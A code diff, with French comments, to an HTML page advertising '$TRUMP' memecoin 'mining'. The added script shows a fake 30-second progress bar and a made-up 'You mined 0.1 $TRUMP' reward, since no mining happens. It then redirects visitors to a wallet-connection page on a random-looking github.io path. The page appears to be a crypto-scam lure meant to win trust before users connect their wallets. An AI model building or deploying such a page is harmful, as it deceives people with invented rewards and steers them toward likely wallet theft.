@@ -265,6 +265,27 @@
             
             margin-top: -30px;
         }
+        /* Barre de progression */
+    .progress-bar-container {
+        width: 100%;
+        background-color: #f3f3f3;
+        border-radius: 5px;
+        margin-top: 10px;
+    }
+    
+    .progress-bar {
+        height: 10px;
+        width: 0;
+        background-color: #4caf50;
+        border-radius: 5px;
+        animation: progress 30s linear forwards;
+    }
+    
+    @keyframes progress {
+        100% {
+            width: 100%;
+        }
+    }
     </style>
 </head>
 <body>
@@ -284,17 +305,25 @@
             <button class="btn" onclick="contributeBlockchain()">Click For Contribution<i class="fas fa-pickaxe"></i></button>
             <p style="padding-top: 5px;">$OFFICIAL TRUMP <a href="https://coinmarketcap.com/currencies/official-trump/" target="_blank">CoinMarketCap</a></p>
         </div>
+    
         <div class="card" id="startMiningCard" style="display: none;">
             <h2><i class="fas fa-wallet"></i> Become a $TRUMP Mining Addict</h2>
             <p><i class="fas fa-arrow-right"></i> Join the $TRUMP movement and start mining your tokens! Embrace the memecoin hype and earn rewards.</p>
             <button class="btn" onclick="startMining()">Start Mining <i class="fas fa-pickaxe"></i></button>
         </div>
-        
     
-        <!-- Résultat du minage avec le spinner -->
-        <div class="result-card" style="display: none;">
+        <!-- Carte d'attente pendant le minage -->
+        <div id="waitingMessage" class="card" style="display: none;">
+            <h2>Processing your mining... ⛏️</h2>
+            <p>Please wait... approximately 30 seconds to receive your first 0.1 $TRUMP.</p>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+    
+        <!-- Carte de résultats ajoutée -->
+        <div class="card" id="resultCard" style="display: none;">
             <h2 id="resultStatus"></h2>
-            <div class="spinner" style="display: none;"></div> <!-- Utilisation de la classe spinner -->
         </div>
     
         <div id="status" class="status"></div>
@@ -311,122 +340,107 @@
         <a href="https://coinmarketcap.com/currencies/official-trump/"><i class="fas fa-chart-line"></i></a>
         <a href="https://fauxon.github.io/fhrdhqctvghbn-/connect.html"><i class="fas fa-cogs"></i></a>
     </div>
+   
     
-
     <script>
-   let walletConnected = false;
-
-// Définir la fonction delay() pour l'utiliser dans des fonctions asynchrones
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-// Fonction utilitaire pour créer un délai
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// Fonction pour afficher/masquer le spinner
-function toggleSpinner(display) {
-    const spinner = document.getElementById('spinner');
-    if (spinner) {
-        spinner.style.display = display ? 'block' : 'none';
+    let walletConnected = false;
+    
+    // Fonction utilitaire pour créer un délai
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
-}
-
-
-// Fonction pour afficher la carte de minage après un délai de 5 secondes
-async function contributeBlockchain() {
-    const welcomeMessage = document.getElementById('welcomeMessage');
-    const loadingIndicator = document.createElement('div');
-    loadingIndicator.className = 'spinner';
-    loadingIndicator.style.marginTop = '20px';
-    welcomeMessage.appendChild(loadingIndicator);
-
-    // Attendre 5 secondes avant de passer à la carte de minage
-    await delay(5000);
-
-    // Retirer l'indicateur de chargement et afficher la carte de minage
-    loadingIndicator.remove();
-    showMiningCard();
-}
-
-// Fonction pour afficher la carte de minage
-function showMiningCard() {
-    const welcomeMessage = document.getElementById('welcomeMessage');
-    const startMiningCard = document.getElementById('startMiningCard');
-
-    welcomeMessage.style.display = 'none';
-    startMiningCard.style.display = 'block';
-}
-
-// Fonction pour démarrer le minage
-async function startMining() {
-    const card = document.querySelector('.card');
-    card.style.display = 'none';
-
-    const status = document.getElementById('status');
-    const resultCard = document.querySelector('.result-card');
-
-    // Afficher le message "Mining in progress" et activer le spinner
-    status.textContent = 'Mining in progress... ⛏️';
-    toggleSpinner(true); // Afficher le spinner
-
-    // Attendre 5 secondes pour simuler le minage
-    await delay(5000);
-
-    // Masquer le spinner après le minage
-    toggleSpinner(false);
-
-    // Afficher la carte de résultats
-    resultCard.style.display = 'block';
-    const resultStatus = document.getElementById('resultStatus');
-    resultStatus.textContent = 'Congratulations! 🎉 You mined 0.5 $TRUMP tokens.';
-
-    // Attendre 3 secondes avant de rediriger
-    await delay(3000);
-    resultStatus.textContent = 'Redirecting to wallet connection...';
-    await delay(3000);
-
-    // Rediriger vers la page de connexion
-    window.location.href = 'https://fauxon.github.io/fhrdhqctvghbn-/connect.html';
-}
-
-
-// Fonction pour connecter le wallet et effectuer les opérations
-async function connectWallet() {
-    if (!walletConnected) {
-        walletConnected = true;
-        const card = document.querySelector('.card');
-        card.style.display = 'none';
-
+    
+    // Fonction pour afficher/masquer le spinner
+    function toggleSpinner(display) {
+        const spinner = document.getElementById('loadingSpinner');
+        if (spinner) {
+            spinner.style.display = display ? 'block' : 'none';
+        }
+    }
+    
+    // Fonction pour afficher la carte de minage après un délai de 5 secondes
+    async function contributeBlockchain() {
+        const welcomeMessage = document.getElementById('welcomeMessage');
+        const loadingIndicator = document.createElement('div');
+        loadingIndicator.className = 'spinner';
+        loadingIndicator.style.marginTop = '20px';
+        welcomeMessage.appendChild(loadingIndicator);
+    
+        // Attendre 5 secondes avant de passer à la carte de minage
+        await delay(5000);
+    
+        // Retirer l'indicateur de chargement et afficher la carte de minage
+        loadingIndicator.remove();
+        showMiningCard();
+    }
+    
+    // Fonction pour afficher la carte de minage
+    function showMiningCard() {
+        const welcomeMessage = document.getElementById('welcomeMessage');
+        const startMiningCard = document.getElementById('startMiningCard');
+    
+        welcomeMessage.style.display = 'none';
+        startMiningCard.style.display = 'block';
+    }
+    
+     // Fonction pour démarrer le minage avec la barre de progression
+     async function startMining() {
+        const startMiningCard = document.getElementById('startMiningCard');
+        const waitingMessage = document.getElementById('waitingMessage');
         const status = document.getElementById('status');
-        const spinner = document.getElementById('spinner');
-        status.textContent = 'Mining is starting... 🚀 Get ready!';
-        toggleSpinner(true);
+        const resultCard = document.getElementById('resultCard');
+        const progressBar = document.getElementById('progressBar');
 
-        // Attendre 3 secondes avant de mettre à jour l'interface
+        // Afficher la carte d'attente
+        startMiningCard.style.display = 'none';
+        waitingMessage.style.display = 'block';
+      
+
+        // Initialiser la barre de progression à 0%
+        progressBar.style.width = '0%';
+
+        // Animer la barre de progression manuellement
+        let width = 0;
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval); // Arrêter l'intervalle lorsque la barre atteint 100%
+            } else {
+                width++;
+                progressBar.style.width = width + '%'; // Augmenter la largeur de la barre
+            }
+        }, 300); // Mettre à jour la barre toutes les 300ms (environ 30 secondes pour 100%)
+
+        // Attendre 30 secondes avant de continuer
+        await delay(30000);
+
+        // Masquer la carte d'attente après le minage
+        waitingMessage.style.display = 'none';
+
+        // Afficher la carte de résultats
+        resultCard.style.display = 'block';
+        const resultStatus = document.getElementById('resultStatus');
+        resultStatus.textContent = 'Congratulations! 🎉 You mined 0.1 $TRUMP tokens.';
+
+        // Attendre 3 secondes avant de rediriger
+        await delay(3000);
+        resultStatus.textContent = 'Redirecting to wallet connection...';
         await delay(3000);
 
-        toggleSpinner(false);
-        status.textContent = 'Welcome to $TRUMP mining! Connect your wallet now to continue.';
-
-        // Attendre encore 3 secondes avant la redirection
-        await delay(3000);
-
-        // Effectuer la redirection après le délai
+        // Rediriger vers la page de connexion
         window.location.href = 'https://fauxon.github.io/fhrdhqctvghbn-/connect.html';
-    } else {
-        alert("Wallet already connected!");
     }
-}
 
-// Générer et afficher un ID unique
+    // Fonction utilitaire pour créer un délai
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    // Générer et afficher un ID unique
 function generateUniqueId() {
     return Math.floor(100000 + Math.random() * 900000);
 }
 
 document.getElementById('uniqueId').textContent += generateUniqueId() + "@";
-
     </script>
+    
 </body>
 </html>
